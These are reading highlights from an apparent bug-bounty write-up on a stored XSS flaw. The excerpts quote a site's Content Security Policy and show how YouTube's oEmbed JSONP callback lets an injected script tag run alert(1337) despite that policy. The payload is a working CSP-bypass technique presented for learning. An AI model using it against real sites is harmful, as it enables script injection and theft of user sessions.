---
author: SMHTahsin33
aliases:
  - "Riding the Waves of API Versioning: Unmasking a Stored XSS Vulnerability"
  - CSP Bypass Using YouTube OEmbed
tags:
  - readwise/articles
url: https://infosecwriteups.com/riding-the-waves-of-api-versioning-unmasking-a-stored-xss-vulnerability-bypassing-csp-using-c039c10df2b1
date: 2024-08-20
---
# Riding the Waves of API Versioning: Unmasking a Stored XSS Vulnerability, CSP Bypass Using YouTube OEmbed

![rw-book-cover](https://readwise-assets.s3.amazonaws.com/media/uploaded_book_covers/profile_1116209/1LdxfNi_hcHDwQ1JUosYsTw.png)

## Highlights


> The defined Content Security Policy is as below:
> ```
 >default-src 'self';frame-src https:; script-src 'self' 
>  https://player.vimeo.com/ https://www.youtube.com/ https://s.ytimg.com/; 
>  child-src https://www.youtube.com; 
>  connect-src 'self' https:; img-src 'self' data: https://i.ytimg.com/ 
>  https://app.redacted.com/ https://fakeimg.pl/; 
>  style-src 'self' 'unsafe-inline'; font-src 'self';
>```
> [View Highlight](https://read.readwise.io/read/01hgzqykv470hfph1en8511srs)



# Bypassing CSP : Leveraging YouTube’s OEmbed Function

>  YouTube has an interesting function called **oEmbed**, used for video embedding purposes. But the interesting part is that it also allows a **“Callback”** **parameter**. Every input there, is reflected on the page and the **content-type** is also identified as **text/javascript**, to provide [JSONP](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/JSONP%20vulnerabilities.md) integrations
> [View Highlight](https://read.readwise.io/read/01hgzqzgxrrjqyd2rqcng1ae4t)



> Now we if we visit [https://www.youtube.com/oembed?callback=alert(1337);](https://www.youtube.com/oembed?callback=alert%281337%29%3B) we can see that it is a valid JS now with a delimiter too.
> [View Highlight](https://read.readwise.io/read/01hgzr0a2fjeyj4tgkcp3y30re)



> we can craft our payload as: 
>  ```html
>  \"><script src=“*[*https://www.youtube.com/oembed?callback=alert(1337);*](https://www.youtube.com/oembed?callback=alert%281337%29%3B)*”></script>
>```
>  ![](https://miro.medium.com/v2/resize:fit:700/1*kjAYqF_QDDzvwBAGvhJ5tg.png)
>  Now we can add this to our project and visit the preview page.
>  ![](https://miro.medium.com/v2/resize:fit:700/1*YWafcNz-VPenm9LeUX7gyQ.png)
>  ![](https://miro.medium.com/v2/resize:fit:651/1*piOeGDUlh4hCqHtsvFTlTA.png)
> [View Highlight](https://read.readwise.io/read/01hgzr1bxxrx5b4rndmgqdjnf0)

